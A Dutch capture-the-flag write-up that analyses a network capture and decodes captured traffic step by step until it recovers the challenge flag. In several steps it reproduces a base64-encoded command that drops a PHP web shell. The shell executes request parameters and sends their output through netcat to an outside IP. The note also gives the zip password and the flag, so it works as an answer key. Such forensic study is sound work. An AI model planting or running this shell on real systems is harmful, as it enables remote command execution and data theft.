> [!INFO] >
> Uitwerking Opdracht What is she doing?

tags: #CTF #hacken [[CTF]]

Opdracht:

![[Pasted image 20230508191855.png]]

Uitwerking:

```
Stap 1:
Open Wireshark en volg TCP stream 1:
```

![[Pasted image 20230508193707.png]]

```
Stap 2:
Kopieer uit de TCP stream de volgende code:

echo%20PD9waHAKaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICRvdXRwdXQ9bnVsbDsKICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICRjbWQgPSAiJGNtZCB8IHppcCAtUCBDcjFtZUcwMEQgfCBiYXNlNjQgfCBuZXRjYXQgLXcxIDE3Mi4xOS4wLjMgNDc0NiI7CiAgZXhlYygkY21kLCRvdXRwdXQpOwogIGVjaG8gaW1wbG9kZSgiCiIsICRvdXRwdXQpOwogIGRpZTsKfTs=%20%7C%20base64%20-d%20%3E%20IAUK9A7R.php
```

```
Stap 3:
Decode deze string met behulp van cyber chef gebruik de URL decoder hiervoor. Dit zou de volgende uitkomst moeten geven:

echo PD9waHAKaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICRvdXRwdXQ9bnVsbDsKICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICRjbWQgPSAiJGNtZCB8IHppcCAtUCBDcjFtZUcwMEQgfCBiYXNlNjQgfCBuZXRjYXQgLXcxIDE3Mi4xOS4wLjMgNDc0NiI7CiAgZXhlYygkY21kLCRvdXRwdXQpOwogIGVjaG8gaW1wbG9kZSgiCiIsICRvdXRwdXQpOwogIGRpZTsKfTs= | base64 -d > IAUK9A7R.php
```

```
Stap 4:
Kopieer vervolgende de volgende code:

PD9waHAKaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICRvdXRwdXQ9bnVsbDsKICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICRjbWQgPSAiJGNtZCB8IHppcCAtUCBDcjFtZUcwMEQgfCBiYXNlNjQgfCBuZXRjYXQgLXcxIDE3Mi4xOS4wLjMgNDc0NiI7CiAgZXhlYygkY21kLCRvdXRwdXQpOwogIGVjaG8gaW1wbG9kZSgiCiIsICRvdXRwdXQpOwogIGRpZTsKfTs=

Dit is een Base64 decrypte code 
```

```
Stap 5:
Decryt de base64 code met behulp van cyberchef dit zou de volgende uitkomst moeten geven:
```

![[Pasted image 20230508195112.png]]

> [!WARNING] >
> Het volgende gedeelte word uitgevoerd in Kali linux
> In de folder /tmp/

```
Stap 6:
Maak een nieuw bestand aan met de naam payload.b64

Commando:
nano payload.b64

```

```
Stap 7:
Haal de gegevens uit wireshark kopieer de gehele inhoud van TCP stream 3. Dit zou de volgende data moeten zijn: 

UEsDBC0ACQAIAGWRjVIAAGWR//////////8BABQALQEAEAAAAAAAAAAAAAAAAAAAAAAAfVgMdiuU

TroYwWm8T2APtJLXaw2lPr/4JhkYL9HLY1eC9V5cw5F2htSXbZGxK2ETiJq2UEsHCPE/LF0zAAAA

AAAAACUAAAAAAAAAUEsBAh4DLQAJAAgAZZGNUvE/LF0zAAAAJQAAAAEAAAAAAAAAAQAAAIARAAAA

AC1QSwUGAAAAAAEAAQAvAAAAfgAAAAAA

Plak dit vervolgens in het net aangemaakte bestand.
```

```
Stap 8:
Decode vervolgens het bestand met het volgende commando:

┌──(kali㉿kali)-[/tmp]
└─$ cat payload.b64 | base64 -d > payload

```

```
Stap 9:

unzip het bestand met het volgende commando:

┌──(kali㉿kali)-[/tmp]
└─$ unzip payload

Hier word om een wachtwoord gevraagd dit wachtwoord is te vinden in stap 5 het wachtwoord is: Cr1meG00D

```

```
Stap 10:
Verander de bestands naam met het volgende commando:

┌──(kali㉿kali)-[/tmp]
└─$ mv - flag

```

```
Stap 11:
Bekijk de inhoud van het bestand met het volgende commando:

┌──(kali㉿kali)-[/tmp]
└─$ cat flag
CTF{e747f3e15f024d92285b6449a03a299c}  

Hier vind je de flag voor het CTF scoreboard

```